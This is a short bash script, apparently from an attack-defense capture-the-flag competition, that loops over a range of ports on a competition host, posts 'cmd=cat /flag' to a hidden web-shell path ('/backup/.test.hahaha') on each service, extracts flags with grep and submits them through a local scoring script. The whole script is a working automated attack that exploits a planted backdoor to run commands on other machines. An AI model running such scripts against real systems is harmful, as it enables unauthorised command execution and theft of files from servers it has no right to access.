#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000 ))
	flagurl=''
	flag=''
	flag=$(curl -s 'http://chals2.eof.ais3.org:'$i'/backup/.test.hahaha' --data 'cmd=cat /flag' | grep -oP 'EOF{.*?}' | head -n1) && bash /home/eof2022/score.sh $j "$flag" | jq . &
	echo $flag
	echo $j
	curl -s 'http://chals2.eof.ais3.org:'$i'/backup/.test.hahaha' --data 'cmd=cat /flag' 
done
